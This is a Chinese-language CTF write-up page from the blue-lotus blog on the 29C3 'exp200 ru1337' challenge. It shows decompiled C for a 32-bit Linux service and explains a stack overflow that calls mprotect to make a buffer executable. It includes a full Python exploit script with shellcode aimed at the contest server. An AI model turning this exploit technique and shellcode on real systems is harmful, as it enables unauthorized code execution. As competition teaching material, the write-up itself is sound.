@@ -1,0 +1,367 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>29C3ctf_exp200_ru1337_writeup - blue-lotus</title>
+  <meta name="author" content="blue-lotus">
+
+  
+  <meta name="description" content="ru1337 为32位linux程序。ru1337 程序执行： D:\nc 94.45.252.242 1024
+ID PASSWORD 1337NESS EVALUATION
+Please enter your username and password User: &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.blue-lotus.net/www/29c3-exp200-ru133">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">blue-lotus</a></h1>
+  
+    <h2>Security Research Team @ Tsinghua University</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.blue-lotus.net/www" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">29C3ctf_exp200_ru1337_writeup</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-12-30T00:00:00+08:00" pubdate data-updated="true">Dec 30<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>ru1337 为32位linux程序。<a href="http://www.blue-lotus.net/wp-content/uploads/2012/12/ru1337.rar">ru1337</a></p>
+
+<!--more-->
+
+
+<p>程序执行：</p>
+
+<pre><code>D:\nc 94.45.252.242 1024
+ID PASSWORD 1337NESS EVALUATION
+Please enter your username and password
+
+User: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Password: aaaaaaaaaa
+u r not s0 1337zz!!!
+</code></pre>
+
+<p>依据结果我们找到如下函数：</p>
+
+<p>char *_&#95;cdecl main&#95;recv&#95;sub&#95;80487E1()</p>
+
+<p>{</p>
+
+<p>char *result; // eax@1</p>
+
+<p>char s; // &#91;sp+24h&#93; &#91;bp-94h&#93;@1</p>
+
+<p>char v2&#91;8]; // [sp+A4h&#93; &#91;bp-14h&#93;@1</p>
+
+<p>int i; // &#91;sp+ACh&#93; &#91;bp-Ch&#93;@2</p>
+
+<p>memset(v2, 0, 8u);</p>
+
+<p>memset(&amp;s, 0, 8u);</p>
+
+<p>result = mmap(0xBADC0DE, 0x88u, 3, 34, 0, 0);</p>
+
+<p>dest = result;</p>
+
+<p>if ( result != -1 )</p>
+
+<p>{</p>
+
+<p>send(fd, &ldquo;ID&amp;PASSWORD 1337NESS EVALUATION\nPlease enter your username and password\n\nUser: &rdquo;, 0x4Fu, 0);</p>
+
+<p>recv(fd, v2, 44u, 0);</p>
+
+<p>for ( i = 0; i &lt;= 7 &amp;&amp; v2[i] &amp;&amp; v2[i] != 10; ++i )</p>
+
+<p>{</p>
+
+<p>if ( !((*_&#95;ctype&#95;b_loc())[v2[i]] &amp; 0&#215;400) )</p>
+
+<p>{</p>
+
+<p>close(fd);</p>
+
+<p>exit(0);</p>
+
+<p>}</p>
+
+<p>}</p>
+
+<p>send(fd, &ldquo;Password: &rdquo;, 0xAu, 0);</p>
+
+<p>recv(fd, &amp;s, 128u, 0);</p>
+
+<p>strcpy(dest, v2);</p>
+
+<p>strcpy(dest + 8, &amp;s);</p>
+
+<p>dup2(fd, 0);</p>
+
+<p>dup2(fd, 1);</p>
+
+<p>result = dup2(fd, 2);</p>
+
+<p>}</p>
+
+<p>return result;</p>
+
+<p>}</p>
+
+<p>内存结果如下：</p>
+
+<p>0xBADC0DE</p>
+
+<p>| user |</p>
+
+<p>| 8bytes | passwd |</p>
+
+<p>return-to-lib-c exploit。user 可以覆盖 ebp、retn address 及后面的8个字节。</p>
+
+<p>注意到0x80487d9处有一个 call _mprotect，我们可以把申请到的内存空间 0xbadc000 的属性改为可执行。</p>
+
+<p>于是在栈上构造 mprotect 的参数 mprotect(0xbadc000, 0&#215;88, PROT&#95;EXEC | PROT&#95;READ | PROT_WRITE)，然后把 shellcode 通过 password 写进去，跳过去执行就可以了。</p>
+
+<p>shellcode使用/bin/sh并不能正确输出</p>
+
+<p>于是使用/bin/cat flag</p>
+
+<h1>&ndash;<em>&ndash; coding: utf-8 &ndash;</em>&ndash;</h1>
+
+<p>import struct, time, socket, sys</p>
+
+<p>ip=&lsquo;94.45.252.242&rsquo;</p>
+
+<p>shellcode = &ldquo;\x31\xc9\x31\xc0\xb0\x05\x51\x68\x66\x6c\x61\x67\x89\xe3\xcd\x80\x89\xc3\x31\xc0\xb0\x03\x89\xe2\x89\xd1\x31\xd2\xb2\xff\xcd\x80\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x89\xe1\x31\xd2\xb2\xff\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80&rdquo;</p>
+
+<p>s = socket.socket(socket.AF&#95;INET, socket.SOCK&#95;STREAM, 0)</p>
+
+<p>s.connect((ip, 1024))</p>
+
+<p>print s.recv(1024)</p>
+
+<p>aaa=&ldquo;A&rdquo; * 20</p>
+
+<p>aaa+=&ldquo;\x08\xc0\xad\x0b&rdquo; #ebp 0x0badc000 + 8</p>
+
+<p>aaa+=&ldquo;\xd9\x87\x04\x08&rdquo; #mprotect_call</p>
+
+<p>aaa+=&ldquo;\x00\xc0\xad\x0b&rdquo; #arg1 0xbadc000</p>
+
+<p>aaa+=&ldquo;\xff\x00\x00\x00&rdquo; #参数2 大小</p>
+
+<p>aaa+=&ldquo;\x07\x00\x00\x00&rdquo; #参数3 添加可执行权限</p>
+
+<p>s.send(aaa)</p>
+
+<p>print s.recv(1024)</p>
+
+<p>bbb=&ldquo;\x90&rdquo;*4 #</p>
+
+<p>bbb+=&ldquo;\x10\xc0\xad\x0b&rdquo; #0xbadc010 指向shellcode</p>
+
+<p>bbb+=shellcode</p>
+
+<p>s.send(bbb)</p>
+
+<p>print s.recv(1024)</p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2012/12/exp200.png"><img src="http://www.blue-lotus.net/wp-content/uploads/2012/12/exp200.png" alt="" width="426" height="153" class="alignnone size-full wp-image-302" /></a></p>
+
+<p>最后提一句，这个 bin 本来不能在栈上执行的，但是 Backtrack 默认情况下没有开 NX（栈保护）。</p>
+
+<p>所以不用mprotect开启E位也可以执行。需要注意用readelf检查属性</p>
+
+<p>同时可以一开始就尝试用\x41 %%%%等暴力尝试。减少读代码时间。</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">hellok</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-12-30T00:00:00+08:00" pubdate data-updated="true">Dec 30<span>th</span>, 2012</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>CTF</a>, <a class='category' href='/blog/categories/writeup/'>writeup</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://www.blue-lotus.net/www/29c3-exp200-ru133/" data-via="" data-counturl="http://www.blue-lotus.net/www/29c3-exp200-ru133/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/hack_u_too-bin50/" title="Previous Post: hack_u_too bin500 writeup">&laquo; hack_u_too bin500 writeup</a>
+      
+      
+        <a class="basic-alignment right" href="/29c3ctf-regexdb/" title="Next Post: 29c3ctf web100 regexdb writeup">29c3ctf web100 regexdb writeup &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
+      </li>
+    
+      <li class="post">
+        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
+      </li>
+    
+      <li class="post">
+        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - blue-lotus -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
